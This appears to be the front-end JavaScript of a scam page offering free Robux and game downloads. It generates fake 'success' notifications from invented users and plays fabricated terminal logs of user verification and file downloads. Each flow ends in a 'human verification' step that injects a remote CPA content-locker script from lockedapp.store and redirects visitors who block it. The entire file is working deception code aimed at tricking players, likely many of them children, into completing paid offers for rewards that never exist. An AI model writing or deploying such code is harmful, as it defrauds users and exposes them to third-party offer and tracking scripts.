/* === PREMIUM NOTIFICATIONS (Popping Effect) === */
const recentActivities = [
    { txt: "User 'Ahmed_99' redeemed 10,000 Points", img: "https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg", time: "Just now" },
    { txt: "User 'SarahK' scored 4,500 Points", img: "https://upload.wikimedia.org/wikipedia/commons/7/7e/Roblox_Logo_2022.jpg", time: "2 seconds ago" },
    { txt: "User 'Mike_Pro' viewed GTA V Concept", img: "./assets/gta5.jpg", time: "5 seconds ago" },
    { txt: "User 'Ghost' rated Spider-Man 2", img: "./assets/spiderman.avif", time: "12 seconds ago" },
    { txt: "User 'X_Killer' won 22,500 Points", img: "https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg", time: "Just now" },
    { txt: "User 'LaraC' accessed RDR2 Showcase", img: "./assets/rdr2.png", time: "8 seconds ago" }
];

function showToast() {
    const activity = recentActivities[Math.floor(Math.random() * recentActivities.length)];
    const container = document.getElementById('toast-container') || createToastContainer();

    const toast = document.createElement('div');
    toast.className = 'toast';

    // Determine icon based on text content if specific image fails or for variety
    const iconSrc = activity.img;

    toast.innerHTML = `
        <img src="${iconSrc}" class="toast-icon">
        <div class="toast-content">
            <div class="toast-title">Success Verification</div>
            <div class="toast-msg">${activity.txt}</div>
            <div class="toast-time">${activity.time}</div>
        </div>
    `;

    container.appendChild(toast);

    // Play sound (Optional - usually blocked by browser autoplay policy)
    // const audio = new Audio('pop.mp3'); audio.play().catch(e => {});

    // Remove after 4 seconds
    setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transform = 'translateY(20px)';
        setTimeout(() => toast.remove(), 500);
    }, 4000);
}

function createToastContainer() {
    const div = document.createElement('div');
    div.id = 'toast-container';
    div.className = 'toast-container';
    document.body.appendChild(div);
    return div;
}

// Start notifications loop
setInterval(showToast, 3500); // Shorter interval for "popping" feel


/* === ROBLOX MOD/QUIZ LOGIC === */
function robloxStep2() {
    const user = document.getElementById('username').value;
    if (user.length < 3) {
        // Shake animation for error
        const input = document.getElementById('username');
        input.style.borderColor = "#ff2a2a";
        input.style.animation = "shake 0.3s";
        setTimeout(() => input.style.animation = "", 300);
        return;
    }

    // Simulate user finding
    const btn = document.querySelector('#step1 .btn-download');
    btn.innerHTML = "Searching...";
    btn.disabled = true;

    setTimeout(() => {
        document.getElementById('step1').classList.remove('active');
        document.getElementById('step2').classList.add('active');
    }, 1000);
}

function selectRobux(amount, el) {
    // Visual selection
    document.querySelectorAll('.amount-card').forEach(c => c.classList.remove('selected'));
    el.classList.add('selected');

    setTimeout(() => {
        document.getElementById('step2').classList.remove('active');
        document.getElementById('step3').classList.add('active');
        startConsole(amount);
    }, 500);
}

function startConsole(amount) {
    const terminal = document.getElementById('terminal-log');
    const barFill = document.getElementById('roblox-fill');

    const steps = [
        { msg: "Connecting to quiz server...", delay: 400 },
        { msg: "Validating username...", delay: 800 },
        { msg: "Fetching quiz data...", delay: 1200 },
        { msg: "User verified!", type: "success", delay: 1600 },
        { msg: `Calculating score for ${amount} points...`, delay: 2400 },
        { msg: "Syncing results...", delay: 3000 },
        { msg: "Finalizing reward package...", delay: 3600 },
        { msg: "Ready to claim!", delay: 4000 },
        { msg: "Spam protection check...", type: "warn", delay: 4400 },
        { msg: "Manual verification required.", type: "error", delay: 4800 }
    ];

    let startTime = Date.now();

    // Progress bar animation
    let progress = 0;
    const progressInterval = setInterval(() => {
        if (progress < 100) {
            progress += Math.random() * 2;
            if (progress > 100) progress = 100;
            barFill.style.width = progress + "%";
        }
    }, 100);

    // Terminal log animation
    steps.forEach(step => {
        setTimeout(() => {
            const div = document.createElement('div');
            div.className = `log-entry ${step.type || ''}`;
            div.innerText = `> ${step.msg}`;
            terminal.appendChild(div);
            terminal.scrollTop = terminal.scrollHeight;

            if (step.msg.includes("verification required")) {
                clearInterval(progressInterval);
                barFill.style.width = "100%";
                setTimeout(showLocker, 1000);
            }
        }, step.delay);
    });
}

function showLocker() {
    document.getElementById('locker').style.display = 'flex';
}

/* === CPA LOCKER TRIGGER (OGAds) === */
function callCpaOffer() {
    // UI Feedback
    const btn = document.querySelector('.locker-box .btn-download');
    if (btn) btn.innerHTML = 'Verify Now';

    // 1. Set the block variable
    window.ogblock = true;

    // 2. Remove any old script instance
    const oldScript = document.getElementById('ogjs');
    if (oldScript) oldScript.remove();

    // 3. Create and inject the script
    const script = document.createElement('script');
    script.type = 'text/javascript';
    script.id = 'ogjs';
    script.src = 'https://lockedapp.store/cl/js/m55o98';

    // 4. AdBlock / Load Handling
    script.onload = function () {
        window.ogblock = false;
        console.log("Locker script loaded.");
    };

    script.onerror = function () {
        console.log("Locker script failed to load.");
        window.location.href = "https://lockedapp.store/adblock";
    };

    // Append to body (standard placement)
    document.body.appendChild(script);

    // 5. Fallback Check (Delayed)
    // We give it 2 seconds. If ogblock is still true, we assume blockage.
    setTimeout(function () {
        if (window.ogblock) {
            window.location.href = "https://lockedapp.store/adblock";
        }
    }, 2000);
}

/* === DOWNLOAD PAGE LOGIC (Optimized 3 Seconds) === */
function startDownloadProcess(gameName) {
    const btn = document.querySelector('.btn-download');
    const terminal = document.getElementById('terminal');

    // UI Updates
    btn.innerHTML = "Initializing...";
    btn.style.opacity = "0.7";
    btn.disabled = true;

    setTimeout(() => {
        btn.style.display = 'none';
        terminal.style.display = 'block';

        // Fast Animation Steps (~3 seconds total)
        const steps = [
            { msg: "Establishing secure connection...", delay: 200 },
            { msg: "Verifying device compatibility...", delay: 500 },
            { msg: `Requesting package: ${gameName}...`, delay: 800 },
            { msg: "Package found (v2.4) - 4.5GB", type: "success", delay: 1100 },
            { msg: "Allocating storage space...", delay: 1400 },
            { msg: "Starting encrypted download stream...", delay: 1700 },
            { msg: "Downloading... 12%", delay: 2000 },
            { msg: "Downloading... 56%", delay: 2200 },
            { msg: "Downloading... 98%", delay: 2400 },
            { msg: "Validating file integrity...", delay: 2600 },
            { msg: "Bot activity suspected. Pausing...", type: "error", delay: 2800 },
            { msg: "Redirecting to Human Verification...", type: "warn", delay: 3000 }
        ];

        steps.forEach(step => {
            setTimeout(() => {
                const div = document.createElement('div');
                div.className = `log-entry ${step.type || ''}`;
                div.innerText = `> ${step.msg}`;
                terminal.appendChild(div);
                terminal.scrollTop = terminal.scrollHeight; // Auto scroll

                if (step.msg.includes("Human Verification")) {
                    setTimeout(showLocker, 500);
                }
            }, step.delay);
        });
    }, 500);
}

/* === Add Shake Animation Keyframes via JS (if not in CSS) === */
const styleSheet = document.createElement("style");
styleSheet.innerText = `
@keyframes shake { 0% { transform: translateX(0); } 25% { transform: translateX(5px); } 50% { transform: translateX(-5px); } 75% { transform: translateX(5px); } 100% { transform: translateX(0); } }
`;
document.head.appendChild(styleSheet);
